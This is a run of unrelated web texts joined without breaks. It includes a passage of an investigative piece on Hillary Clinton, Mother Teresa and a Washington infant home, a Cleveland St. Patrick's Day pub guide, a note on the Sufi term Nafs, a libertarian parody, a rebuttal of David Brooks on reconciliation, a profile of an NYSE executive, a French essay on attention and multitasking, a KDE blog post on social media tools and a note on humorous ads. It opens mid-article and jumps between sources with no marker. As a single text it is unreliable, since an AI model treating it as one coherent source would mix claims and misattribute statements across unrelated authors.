Mother Teresa had used her platform as guest speaker to chastise the Clintons ( standing right beside her , smiles stretched to the breaking point ) for their nominal support of abortion rights .
“ Any country that accepts abortion is not teaching its people to love , but to use any violence to get what they want , ” Mother Teresa said , and went on to suggest adoption be promoted as an alternative to abortion .
“ Please do n’t kill the child .
I want the child .
Please give me the child . ”
Mother Teresa ’s pro-life fans swooned , with many giving the nun a standing ovation .
The Clintons remained seated , yet both — particularly the ever- politic Hillary — understood how behind - the - scenes power politics work within the Christian Right , and responded to the rebuke by finding “ common ground ” with the nun .
Although Clinton did n’t mention this in her public reminiscence last week , after C - Span stopped taping and the breakfast plates were cleared , Fellowship head Doug Coe gently brokered a peace between Hillary and Mother Teresa .
Coe left the Breakfast with one of the most powerful women in America in his debt for political services rendered .
And Mother Teresa had the satisfaction of watching Hillary ’s support for abortion as a fundamental right give way to an acceptance of it as a “ tragedy ” — one that should be made as “ rare ” as possible .
In the long run , Hillary turned a public scolding into a highly visible friendship with a figure whose widely accepted moral bona fides came with an explicitly anti-abortion imprimatur from the Christian Right .
Clearing the Way for a Rejection of Reproductive Rights
In Clinton ’s reflections at the breakfast last week — a reprise of her description of the event in her autobiography Living History — she painted a softer picture of the tense moment :
In February of 1994 , the speaker here was Mother Teresa .
She gave , as everyone who remembers that occasion will certainly recall , a strong address against abortion .
And then she asked to see me .
And I thought , “ Oh , dear . ” ( Laughter . )
And after the breakfast , we went behind that curtain and we sat on folding chairs , and I remember being struck by how small she was and how powerful her hands were , despite her size , and that she was wearing sandals in February in Washington .
( Laughter . )
We began to talk , and she told me that she knew that we had a shared conviction about adoption being vastly better as a choice for unplanned or unwanted babies .
And she asked me — or more properly , she directed me — to work with her to create a home for such babies here in Washington .
I know that we often picture , as we ’re growing up , God as a man with a white beard .
But that day , I felt like I had been ordered , and that the message was coming not just through this diminutive woman but from someplace far beyond .
After the breakfast , Emily Belz , a reporter for the evangelical magazine World , grew curious about what ever happened to the “ home for babies ” and the adoption plans Clinton described .
Belz found that it had closed years ago , and that the nuns who ’d staffed it would n’t talk to the press .
According to a pastor at the church next door to the home ’s former location , the adoption ministry failed to take off because the Roman Catholic nuns who ran it were n’t allowed to care for babies without medical personnel on site .
“ I ’m not sure the legal thing that came down upon them , but they realized they needed to expend their energies in another way , ” said Maureen Freshour , who along with her husband , David , pastors Chevy Chase Baptist Church and lives nearby .
Freshour has stayed in touch with the nuns from the Missionaries of Charity order who ran the home and said that the remaining three or four sisters have moved to another house in Washington , where they are ministering to the homeless .
I called the Missionaries of Charity in Washington , a worldwide Roman Catholic order established by Mother Teresa .
The nun who answered the phone said she could n’t give her name because they are n’t allowed to talk to the press .
She did say , however , that the sisters who are in the order now were not in the order when the adoption home opened , so she was n’t sure why it closed .
She added that the order sold the Chevy Chase house in 2002 .
“ We work with the poor and we did n’t have any work there because it ’s a rich neighborhood , ” she said .
For our 2007 investigative report in Mother Jones on Clinton ’s conservative alliances and her connection with the Family , we also explored what became of the Mother Teresa Home for Infant Children , and encountered similar obstacles .
Although Belz was concerned about whether the home was used for its intended purpose , there is another takeaway from Clinton ’s continuing emphasis on the story : what it reveals about Clinton ’s pioneering “ common ground ” efforts on abortion .
From a face - saving partnership with the beloved pro-life figure of Mother Teresa , Clinton continued to declare all abortions “ tragic , ” align herself with stringently anti-abortion and other conservative actors , and serve as the model for a generation of Democratic politicians eager to disown any affiliation with reproductive rights .
In delving into Clinton ’s religious history , we studied her relationships with a number of spiritual mentors , including Tikkun ’s Michael Lerner , who was soon replaced by “ sacred psychologist ” Jean Houston , who famously helped the First Lady get in touch with the ghost of Eleanor Roosevelt .
Later , after Mother Teresa died , Clinton invoked the spirit of the nun as her guiding light so religiously that one might be excused for wondering whether she meant it more than metaphorically .
Mother Teresa , after all , was the catalyst for the strange religion by which Clinton came to be friends with far - right Senator Sam Brownback .
( Watching Clinton suffer the upbraiding with a smile , former Clinton - foe Brownback recalled his thoughts to Jeff : “ Now , there ’s gotta be a great lesson here . ”
He found it when Clinton got to the Senate and joined him in supporting Tom DeLay ’s “ Day of Reconciliation ” resolution following the 2000 election , urging Americans to “ pray for our leaders , ” especially Bush . )
The Empty Orphanage
After Clinton bowed to Mother Teresa ’s reproof from the dais , she gained some bipartisan credibility .
Mother Teresa got something out of the deal as well : a now - empty building that could serve as a brick and mortar symbol for faith - trading politics .
After the 1994 Breakfast , Mother Teresa insisted Clinton prove her dedication to abortion alternatives by setting up an orphanage for the nun in Washington DC .
In her autobiography , Clinton writes that Mother Teresa was a “ relentless lobbyist , ” pushing Hillary to follow through on her promise to get Mother Teresa “ her center for babies . ”
This was “ no small feat , ” as Belz notes , “ in a city that was known then for its inefficient and corrupt bureaucracy . ”
But as Clinton describes in Living History , she put the muscle of the White House behind the initiative , “ cutting red tape with the housing authorities and human services officials . ”
The Mother Teresa Home for Infant Children opened in 1995 .
On opening day , writes Clinton , Mother Teresa “ gripped my arm in her small , strong hand and dragged me upstairs to see the freshly painted nursery and rows of bassinets waiting to be filled with infants .
Her enthusiasm was irresistible .
By then I fully understood how this humble nun could move nations to her will . ”
Now , the building that had housed the orphanage ( on Western Avenue in the affluent neighborhood of Chevy Chase , in DC ) has no more bassinets .
In fact , when we reported on the house in 2006 , it was for sale : a $ 3 million Tudor mansion being advertised as an ideal embassy location in one the most affluent neighborhoods in the country , home to a host of foreign military commissions and attachés .
Several houses down from the now - empty “ center for babies , ” at the Chevy Chase Baptist Church , an administrator told us that the organization had relocated to DC proper .
Glancing at Kathryn ’s stomach and assuming the worst , she warned us that the organization “ no longer cares for infants . ”
At the Washington location , next to a hospital and opposite a Catholic school , we found a two - story brownstone with a sign outside reading “ Missionaries of Charity ” : the name of Mother Teresa ’s 4,500 - strong Vatican order .
The missionaries have been the target of ongoing accusations from former volunteers and employees who charge that many of the charity donations sustaining the reportedly $ 100 million operation are funneled away from their intended — and often specified — destinations .
Instead , they claim that donations finance evangelism programs or lavish headquarters , and that the operating principle of Missionaries of Charity chapters is to place the “ spiritual well - being ” of poor patients above their physical condition , secretly baptizing dying patients while refusing to use their abundant financial resources to deliver life - saving medical treatment .
We wanted to ask Teresa ’s organization why they ’d flipped the property , and whether they ’d ever had the proper medical facilities in place for an orphanage .
But when we knocked on the door to the DC Missionaries of Charity , no one answered .
And when we called , a volunteer upstairs told us , in a soft but unbudging voice , that she could not come down to let us in ; that she could not answer any questions about how the Home for Infants had become a Missionaries of Charity chapter ; that they had no literature to give us , nor any representative we could contact later ; that they were a charity yes , but she could n’t tell us in what way ; and that , lastly , she had to hang up now .
Clinton ’s office would prove no more forthcoming .
When contacted numerous times in 2006 for comment , Clinton ’s representatives seemed distressed by the very line of questioning , as though the then - Senator ’s good intentions should suffice .
It ’s a story that reads like the moral of Clinton ’s courtship of the religious right : a “ center for babies ” meant to symbolize the “ common ground ” Clinton and the anti-abortion hardline share , since drifted quietly into a sectarian operation with deeply conservative religious practices , and ethics questions that remain unanswered .
Research support for this story was provided by the Investigative Fund at the Nation Institute .
Only in America ... it's St. Patrick 's Day -- at least as we 've come to know it .
The traditions surrounding the religious - holiday - meets - expression - of - pride - meets - party - hearty - marathon have come a long way since a shepherd named Maewyn Succat became the patron saint of Ireland .
So much so that a Dubliner like Declan Synnott could n't believe his eyes when he celebrated his first St. Patrick 's Day in America .
Beyond parade , the party flows to area pubs
There 's the parade , of course .
At 1:04 p.m. Wednesday , the 143rd installment of Cleveland 's St. Patrick 's Day Parade will step off at Superior Avenue and East 18th Street .
But the action will start earlier and run much later in these Irish pubs :
Flannery 's Pub , 323 E. Prospect Ave. , Cleveland , 216-781-7782 : Whoa , an all - day bash by Pogues tribute band the Boys From County Hell ?
Yep , it runs from 1 to 8 p.m .
They better not run out of beer .
Charles Stewart Parnell Pub , 2167 Lee Road , Cleveland Heights , 216-321-3469 .
No chest thumping .
No kitsch .
Just a swell neighborhood bar that just as well could be in Ireland .
P.J. McIntyre's Irish Pub , 17119 Lorain Ave. , Cleveland , 216-941-9311 :
This place feels like an old pub an ocean away -- from the words of W.B.
Yeats inscribed under the beer taps to the old - looking wooden sign that directs you to Ireland ( or to the bathroom ) .
It opens at 7 a.m. on St. Paddy 's Day and features dancers , pipers and music by Mary 's Lane .
Stamper 's Grill Pub , 21750 Lorain Road , Fairview Park , 440-333-7826 :
What happens when you cross an Irish Tiki " Paddy - O Bar " with green beer ?
Yep , a woohoo time that starts at noon and boasts Irish food and music by Brace Yourself Bridget .
Stone Mad , 1306 West 65th St. , Cleveland , 216-281-6500 : Yes , the enchanted cobblestone drive came from Scranton Road .
But Stone Mad looks and feels like a pub in Ireland .
The St. Paddy 's
Day party here will , too .
Corned beef , yes .
But the pub will serve up Irish stew and soda bread , and music by Killroys ( 10 a.m. ) and Pitch the Peat ( 3 p.m. ) .
Nighttown , 12383 Cedar Road , Cleveland Heights , 216-795-0550 : Corned beef and cabbage , of course .
But this pub will also serve up salmon from Ireland , lamb stew and music by the New Barleycorn ( 5 and 8 p.m. ) .
The Treehouse , 820 College Ave. , Cleveland , 216-696-2505 : Yes , it opens 10 a.m. on St. Patrick 's Day , with beer , corned beef and music by Pitch the Peat ( 8 p.m. ) .
But this Tremont mainstay also boasts St. Paddy 's eve and day - after parties .
Loch Erie kicks it off at 9 p.m. Tuesday , and the Treehouse 's hangover bash is at 5 p.m. Thursday .
Harp , 4408 Detroit Avenue , Cleveland , 216-939-0200 :
It 's like an Irish cottage looking out on Lake Eire , er , I mean , Erie .
But it 's also Ground Zero on St. Paddy 's Day , when it rolls out a tent -- starting at 8 a.m. -- complete with beer , pipers and Irish treats .
-- John Petkovic
" It was a culture shock , " says Synnott , co-owner of the Charles Stewart Parnell Pub in Cleveland Heights .
" In Ireland , you go to church and spend the day with your family .
In America , it 's a big party . "
The party comes with all sorts of Irish traditions .
You know , like corned beef .
" I never knew that was an Irish tradition , at least while I lived in Ireland , " says Synnott , who came to America in 1994 .
" I always thought it was a Jewish thing . "
Well , it was -- until New Yorkers co-opted it into St. Patrick 's Day .
" My mom thinks it 's hysterical , " says Eileen Sammon , a first - generation Irish - American and co-owner of Stone Mad pub in Cleveland .
" She never even had corned beef until she moved to America . "
That has n't stopped mom from cooking for the pub's St. Patrick 's Day celebration .
And , yes , Sheila Sammon makes corned beef -- as well as Old World St. Paddy staples such as Irish stew and soda bread .
Green beer is the line in the sand for many Irish , though .
" Why ruin a perfectly good Irish beer ? " Synnott says .
" There 's a reason Guinness is n't green . "
Ah , but everyone loves a parade -- even if it , too , is an American creation .
Seeing it was a culture shock for Irish expat Brendan Ring , owner of Nighttown in Cleveland Heights .
" I moved to America on March 16 , 1984 , " says Ring .
" So the next day , I took the subway to Manhattan to see the parade . "
At first , he felt a little confused .
" I did n't know what was going on when I saw a black man on the train with his hair dyed green -- I never even saw an Irishman with green hair , " says Ring .
" But when I walked outside and saw a sea of green in this massive parade , I realized that I was n't a foreigner anymore :
We 're all Irish on St. Patrick 's Day . "
We 're all Irish in no small part because of these traditions -- created in America and embraced as part of St. Patrick 's Day :
The word Nafs cannot easily be translated to English .
Depending on the context it can mean different .
This Wikipedia article explains further about “ Nafs ”
Other than the obvious meaning this anecdote has , there is a more subtle meaning that heaven can also be experienced in this world , here & now .
If the experience of heaven is defined as the state of highest pleasure .
Once we are able to overcome our individual Ego(s ) , and remove the veil between us and God , we will begin to experience the Oneness with God .
There is nothing more pleasurable than this state .
The description of heaven is pale in comparison to this .

You might have read the story about the Socialist Alarm Clock .
Here ’s one version .
A friend who wishes to remain anonymous sent his libertarian version and asked me to post it ( cross- posted at Division of Labour and The Beacon ) :
“ This morning I was awoken by my alarm clock built by the ingenuity of millions of individuals all working for their own gain , but whose efforts were coordinated by the prices for labor and materials and finished goods provided by the free market .
I then took a shower in the clean water provided by the shower head , pipes , and sanitation facilities whose construction also involved the efforts of thousands of people acting in their independent interest .
After that , I turned on the TV to The Weather Channel , whose owners include one of the largest multi-national corporations and private equity companies , to see the week ’s forecast presented in a clear , informative ( and even entertaining ) manner .
I watched this while eating breakfast of General Mills ’ inspected food and taking drugs whose strong brand name gives me confidence in its safety .
At the time which millions of people coordinate their activities to take advantage of each other ’s knowledge and skills , I leave for work .
I get into my Japanese - designed , Mexican - supplied , Michigan - assembled automobile and set out to work on the roads built by construction contracting companies and named after corrupt politicians , possibly stopping to purchase additional fuel that was shipped from the Middle East by an oil company at a per gallon cost many times lower than the price of having a letter delivered across the street by the government monopoly that loses millions of dollars each year .
To make the purchase there is no need to leave the pump ; I am able to slide a piece of plastic into a small slot and get credit extended to me by a bank who has never met me in person .
On the way out the door , I put out the Fed - Ex envelope containing the documents I need to arrive across the country tomorrow morning and drop the kids off at the public school which is attended by only the best students , thanks to the high home prices in the area .
After work , I drive my Japanese - Latino - Midwestern car back home , to a house which has not burned down in my absence because of materials developed in the research and development departments of hundreds of corporations and which has not been plundered of all is valuables thanks to the lock on the door and a sign advertising the security company whose services I employ .
My piece of mind was not interrupted by the thought of these events anyway , as I have both fire and homeowners insurance through privately held insurance company .
I then log on to the internet to watch and listen to artists who do n’t appeal to a broad enough audience to make it onto one of the few channels that a government monopoly allows to be broadcast .
I then log onto the democraticunderground.com to post about how DEREGULATING the medical industry is BAD because low - cost , quality health care can never be provided by greedy , self - interested people . ”
Everything David Brooks says about reconciliation is wrong
Jon Chait did a very funny job taking apart David Brooks 's column on reconciliation .
I want to do a serious job on it .
The factual statements Brooks uses in his argument are wrong .
Not arguable , or questionable , or suspicious .
Wrong .
And since everything else flows from those wrong facts , the rest of the column can't be taken seriously .
" Reconciliation has been used with increasing frequency , " writes Brooks .
" That was bad enough .
But at least for the Bush tax cuts or the prescription drug bill , there was significant bipartisan support . "
The outcome of letting reconciliation go from rare and bipartisan to common and partisan is that we will go from a Senate where " people are usually pretty decent to one another " to a Senate that " bleaches out normal behavior and the normal instincts of human sympathy . "
Chilling stuff , huh ?
But none of Brooks 's evidence is true .
Literally none of it .
The budget reconciliation process was used six times between 1980 and 1989 .
It was used four times between 1990 and 1999 .
It was used five times between 2000 and 2009 .
And it has been used zero times since 2010 .
Peak reconciliation use , in other words , was in the ' 80s , not the Aughts .
The data are n't hard to find .
They were published on Brooks 's own op - ed page .
Nor has reconciliation been limited to bills with " significant bipartisan support . "
To use Brooks 's example of the tax cuts , the 2003 tax cuts passed the Senate 50 - 50 , with Dick Cheney casting the tie - breaking vote .
Two Democrats joined with the Republicans in that effort .
Georgia 's Zell Miller , who would endorse George W. Bush in 2004 and effectively leave the Democratic Party , and Nebraska 's Ben Nelson .
So I 'd say that 's one Democrat .
One Democrat alongside 49 Republicans .
That 's not significant bipartisan support .
Another example : In 1993 , Bill Clinton passed the Omnibus Budget Reconciliation Act .
The final tally was , again , a tie broken by the vice president .
In this case , not a single Republican voted for the bill .
As for the prescription drug benefit ?
The prescription drug benefit did n't go through reconciliation .
It was passed through the normal order .
Brooks is simply wrong on this .
To recap , Brooks argued that reconciliation is being used more frequently , and that past reconciliation bills , like Bush 's tax cuts and prescription drug benefit , were significantly bipartisan .
Reconciliation is , in fact , being used less frequently , past reconciliation bills like the tax cuts were not significantly bipartisan by any stretch of the imagination , and the prescription drug benefit did not go through reconciliation .
Brooks is n't wrong in the sense that " I disagree with him . "
He 's wrong in the sense that the column requires a correction .
A bit grayer and world wearier , maybe , but there ’s no mistaking the family resemblance between NYSE Chief Operating Office Larry Leibowitz and his kid brother Jon Stewart .
Unlike the Daily Show host , Leibowitz mostly keeps a low profile , although he did find himself in the spotlight even before his appearance at the Reuters Global Exchanges and Trading Summit on Monday .
The Wall Street Journal interviewed him in a story about the NYSE ’s effort to turn some high frequency traders — who have been chipping away at the exchange ’s business — into exchange floor traders .
Leibowitz may be sick of the Jon Stewart questions , but when pesky Reuters editors and journalists inevitably raised them , he answered them with relatively good humor .
“ I know my mother ’s pretty happy with both , ” the NYSE ’s resident electronic trading expert said when asked whether it was tough living in the shadow of the celebrated news comedian .
Leibowitz allowed that it was hard to imagine two brothers who had chosen more different careers .
At this point , they even have different last names , after Leibowitz ’s younger brother adopted a stage name .
While Stewart has n’t shied away from financial themes , especially in his much - hyped verbal smackdown with Jim Cramer , Leibowitz said his kid brother has n’t been running to him to ask for advice , even when his show has tackled topics like short selling and high frequency trading .
But he admitted that being an older sibling , “ I give it to him anyway sometimes . ”
Would he ever go on the Daily Show as a guest ?
That would be a no .
“ I probably would n’t make a very good guest , ” he said , noting he did n’t have any books to plug .
“ I have tried to fly under the radar . ”
Avec le ton assez personnel auquel il nous a accoutumé , Howard Rheingold , l’auteur des Foules intelligentes , dans un récent billet évoque son métier de professeur à l’heure des téléphones et des ordinateurs connectés .
Non par pour dénoncer l’inattention de ses élèves – « une salle pleine de gens qui ne sont pas en train de me regarder ou de se regarder , mais qui semblent être hypnotisés par quelque chose sur leur écran d’ordinateur » – et leur propension à accomplir plusieurs tâches à la fois , mais pour interroger les méthodes d’enseignement à l’heure des ordinateurs connectés , dont Howard Rheingold encourage l’utilisation en cours .
Comment les utiliser et à la fois prêter attention au professeur et veiller à ce que les étudiants ne sortent pas du cours via les écrans ?
Comment être attentif dans un monde où les sollicitations sont multiples ?
Après avoir porté un regard réflexif sur la pratique de ses élèves ( qu’il a même filmé ) , Howard Rheingold s’intéresse à la maîtrise de l’attention ( le sujet avec lequel il ouvre ses cours , comme il l’explique en vidéo ) .
Et d’expliquer que la maîtrise de l’attention en classe , pour lui , est un exercice collectif et toujours mouvant , auquel il doit fortement associer ses élèves .
Parfois , pour ramener l’attention , il demande à ses étudiants de fermer leurs ordinateurs et à d’autres moments , il leur demande de tchatter sur ce qu’il dit , pendant qu’il demande à un autre groupe de faire une recherche sur le sujet qu’il a lancé et à d’autres de prendre des notes de ce qu’il raconte pour les partager avec le reste de la classe .
Howard Rheingold a ainsi testé in vivo l’application de multiples règles , lui permettant de comprendre que celles - ci sont des outils essentiels pour ceux qui voudraient maîtriser l’art de l’attention à l ’ère de la connexion permanente .
Image : La salle de classe d’Howard Rheingold vue par l’oeil du professeur sur son vlog .
Mais le but doit rester clair , selon lui :
« Je veux que mes étudiants apprennent que l’attention est une compétence qui doit être apprise , pratiquée , et mise en forme : cette compétence doit évoluée si l’on évolue .
L’extension technologique de notre esprit et de notre cerveau par les puces et le net a apporté une réelle puissance à des milliards de personnes , mais même dans les premières années de cette connexion permanente , il est clair que même pour les technologues enthousiastes de mon acabit , cette puissance peut induire en erreur , fasciner et détourner ceux qui n’ont pas appris – à qui l’on n’a jamais enseigné – comment exercer un contrôle mental sur les outils qu’on utilise . »
« J’ai tendance à découvrir les choses en trébuchant sur elles , puis à me demander ce qu’elles signifient , d’où elles viennent , qui est derrière elles » , explique Howard Rheingold en faisant référence aux travaux de Linda Stone sur ce qu’elle appelle « l’attention partielle continue » et ceux de Cliff Nass du Département de communication de l’université de Stanford qui travaille à mesurer l’efficacité de ceux qui accomplissent plusieurs tâches en même temps ( multitasking ) ou encore le récent livre de Winifred Gallagher sur le sujet .
Quand quelque chose de lumineux clignote ou apparaît sous nos yeux , il a tendance à gagner automatiquement la compétition pour l’attention de notre esprit … «
Il faut beaucoup de force de caractère à votre cerveau pour ne pas traiter un stimulus aussi fort qu’une publicité télévisuelle » , explique le professeur DeSimone , directeur de l’Institut pour la recherche sur le cerveau du MIT .
« Si vous essayez de lire un livre en même temps , vous risquez de ne pas avoir les ressources cognitives suffisantes pour vous concentrer sur les mots » Les neuroscientifiques ont identifié un processus de synchronisation du cerveau , qui permet de travailler à des thérapies capables de renforcer l’attention à partir d’impulsions lumineuses justement ( voir pour plus de précision ce qu’en disait Rémi Sussan dans nos pages ) .
« Notre capacité à être multitâche est un mythe » , assène Winifred Gallagher .
«
Vous ne pouvez pas faire deux choses à la fois .
Le mécanisme de l’attention est la sélection : c’est ou l’un ou l’autre . (…)
Les gens ont pourtant du mal à comprendre que l’attention est une ressource finie , comme l’argent »
Génération multitâche ou diabolisation des pratiques générationnelles ?
Reste que , comme l’explique Howard Rheingold , il y a encore beaucoup à faire pour apprendre à être attentif ( et à ne pas l’être ) .
Assurément , un défi s’annonce , comme le proclament plusieurs articles qui interrogent la génération multitâche voire en dénoncent son mythe .
Pourtant , la capacité du cerveau humain à faire deux choses en même temps n’est pas née avec les nouvelles technologies : voilà longtemps que nous savons faire quelque chose en parlant ou en chantant , ou que nous savons conduire en écoutant la radio par exemple .
Mais pour beaucoup , le phénomène s’accélère avec l’internet qui nous rend capables de tenir plusieurs conversations en même temps , tout en cherchant quelque chose dans un moteur de recherche , en regardant une vidéo et en écoutant de la musique .
Une étude de la Kaiser Family Foundation en 2005 avait souligné que si les enfants entre 8 et 18 ans passaient 6,5 heures par jours sur des médias électroniques ils étaient exposés à quelques 8,5 heures de médias dans le même temps en faisant plusieurs choses à la fois .
Image : CC . « My Competitive Nature is Such » par Betenoir .
Bien évidemment , beaucoup de psychologues , d’éducateurs , de scientifiques ou de simples commentateurs s’en inquiètent voire s’en alarment .
«
En fait quand vous faites plus d’une chose , vous les ordonnez et vous décidez toujours laquelle faire à quel moment » , rappelle le neuroscientifique Jordan Grafman responsable de section neuroscience cognitive à l ’Institut national des désordres et attaques neurologiques .
Nous savons faire plein de choses en parallèle , mais c’est une capacité qui décline au - delà de 60 ans et que les petits enfants ont également du mal à accomplir .
La capacité à accomplir plusieurs tâches en même temps a ses limites , même pour les jeunes adultes .
Quand les gens essayent de faire deux ou plusieurs tâches en même temps ou en alternant rapidement entre elles , le taux d’erreur grimpe et cela prend plus de temps à accomplir que quand on le fait de manière séquentielle , explique le professeur David Meyer , directeur du Laboratoire Cerveau , cognition et action à l’université du Michigan .
Bien sûr , si vous devez résoudre un problème d’algèbre en même temps que vous tenez une conversation par messagerie instantanée , le problème d’algèbre risque de prendre plus longtemps à être résolu …
Mais force est de constater qu’il s’agit rarement , en terme de pratique , de faire des choses qui méritent beaucoup d’attention en même temps .
Et que nos outils numériques démultiplient peut - être aussi les micro-tâches , celles qui ne méritent pas beaucoup d’attention justement …
Ce que confirme le professeur Meyer d’ailleurs : d’autres recherches montrent que la relation entre la stimulation et la performance suit une courbe en cloche : une petite stimulation – un café ou une musique bruyante – peut stimuler les performances , mais trop de stimulation est stressante et entraîne une chute de l’attention .
De plus , le cerveau a besoin de repos et de temps de récupération afin de consolider pensées et souvenirs .
Ceux qui remplissent chaque moment de tranquillité par un appel téléphonique ou une stimulation électronique ne reçoivent pas l’apaisement dont ils ont besoin , ce qui conduit leur cerveau a un état de surexcitation qui leur rend encore plus difficile de se concentrer quand ils en ont besoin .
Dans les universités américaines , à l’image de ce que connaît Howard Rheingold , plusieurs professeurs cherchent des solutions .
Beaucoup interdisent les ordinateurs en classe .
« Je demande à mes étudiants de ne pas me traiter comme une télé » , explique Aaron Brower professeur à l’université du Wisconsin .
D’un autre côté , cette génération est plutôt habile à manipuler l’information et à analyser images et données visuelles .
Quitte à reconnaître que les classes ne lisent plus beaucoup de livres du début à la fin… ironise Claudia Koonz , professeure d’histoire à la Duke University .
«
Et c’est la Duke University ! » , rappelle - t- elle pour dire que cela ne concerne pas que les plus mauvaises écoles …
Jusqu’à donner le sentiment d’altérer leur capacité à tenir un raisonnement du début à la fin …
Dans les travaux de mes élèves , « je trouve des paragraphes avec une logique interne , mais qui ne suivent pas nécessairement une ligne d’argumentation construite » , explique encore Claudia Koonz au Time .
Koonz les trouve même moins tolérants à la complexité .
Selon elle , cette aversion est directement liée au multitâche : «
C’est comme s’ils avaient trop de fenêtres ouvertes sur leur écran .
»
Pour compenser , il faut que les choses soient plus simples , plus accessibles …

" In the beginning there was nothing .
Somehow out of this nothing came everything .
Out of this vibrant nothingness - matter , energy , space , time , consciousness , mind emerged . "
If you ’re reading this via Google Buzz then this post was brought to you by WordPress , Identi.ca , Twitter and Google .
That ’s either impressive or horrifying …
Social Media tools suck
On the one hand , it ’s kind of nice that interoperation is possible at all , but on the other it ’s a silly chain with many unnecessary points of fail .
I can use WordPress to blog and that plays quite nicely with Identi.ca – I can syndicate the posts to Identi.ca and likewise list my dents here – things talk to each other .
I can also syndicate from Identi.ca to Twitter , but Identi.ca ( and therefore I ) know nothing about replies at Twitter .
From Twitter posts get passed to Google Buzz , but I know nothing about what happens there unless I happen to log in to the GMail web interface .
Chances are that there are some people on Twitter wondering why I ’ve @replied to them about something they never posted – markey on Twitter != markey on Identi.ca for example .
Identi.ca is made usable and useful by the KDE microblog widget – I simply would n’t use it if I had to actually visit the website and log in – that takes longer than the dent .
Web interfaces suck .
Similarly , I can interact with GMail via KMail ( or I could , actually I prefer to have Google forward my mail to another server , a throwback from the days when GMail either did n’t support IMAP or it was a bit funky ) .
GMail ’s web interface , while better than other webmails , sucks .
Twitter and Buzz , without convenient desktop interfaces that I use already , simply do not get visited by me on even a weekly basis .
In terms of Social Networking , I have Facebook ( which I got bullied in to years ago and kinda use , infrequently ) , LinkedIn ( dunno if I ’m going to do much with that , another sucky web interface ) and Flickr ( only for KDE promo ) .
Facebook and Flickr are made more bearable by the excellent digiKam image export tools 🙂
Infrastructure for KDE Promo sucks
Similarly , the KDE community wiki sucks – as a collaboration tool ( it ’s fine for storing info and userbase and techbase are both awesome ) .
I need to discuss things by mail , then open a browser , log in ( which requires a round trip to my openid provider if I want the same account on all the wikis ) .
Then I need to remember how to use wiki markup .
That ’s my excuse for the various things I should have done on the promo wiki and have n’t done .
There are things we can do better with the wiki , but the basic problems remain .
Collaborative writing tools suck too .
Email is rubbish for actually keeping track of stuff .
Google docs is amazing in its way , but it ’s another web interface , does n’t work in Konqueror ( or does it nowadays ? ) , is not free and is slow compared to a desktop app .
Kobby ( and Gobby ) also do n’t meet our needs – yet …
Really , I want a single “ KDE Promo ” app that deals with all the above .
I ’d like a pony too , please 🙂
You can call it Kommunicator or Kollaborator if you like .
The app , not the pony .
He ’s called Shergar .
There is hope …
Sorry if all that sounds a bit gloomy .
There are some good points too 🙂
The KDE microblog widget rocks .
Kopete sorts out my soup of instant messaging accounts , making MSN , Yahoo , Google Talk , and Facebook Chat not suck to the extent that I do n’t need to care or even know what network I ’m chatting to someone on .
Kontact makes my email , calendars and contacts portable thanks to the magic of Kolab PIM data structures .
Ok , the point I ’m trying to get to is that all these amazing new social tools we have are limited because they do n’t interoperate by open standards , only allow some limited syndication .
I want to operate my Identi.ca and Twitter and Buzz accounts as one .
I do n’t want to have to point Google Buzz at Twitter because they did n’t implement the Identi.ca API yet .
I want my Facebook stuff and my Linked in stuff in a single view in Kontact or a Plasma Widget , not in some web browser or web browser widget .
Frank Karlitschek covered some similar ground a bit more coherently in his Camp KDE talk – be sure to check out the other talks too .
Together with grappling with the Promo pages on the community wiki and discovering Google Buzz , that ’s what has really prompted this post .
The new services we ’re seeing are exciting and can be useful and Google are helping to remove some of the suck from browser - based apps , but you have to wonder why they fix the browser rather than just using the desktop .
ownCloud may have some of the answers , complemented by KDE software ( reimplementable by anyone else by using open standards too ) .
Perhaps we can even succeed in , as it were , “ freeing the web from the browser ” .
Only time will tell .
Do you have a restaurant , bar , club .. or something else ?
Ofcourse you want that your clients be satisfied , so try to be creative and fun , and 100 % your clients will come back with their friends to show them your cool place , NO ?
Like he did it !
This funeral service came with this funny ideea .
I 'm sure that you 'll laugh when you see it .
That ad make you feel better , and you 'll show that to your friends .
This two bright ideeas are powerful ads , because are funny , and people talk a lot about funny things .
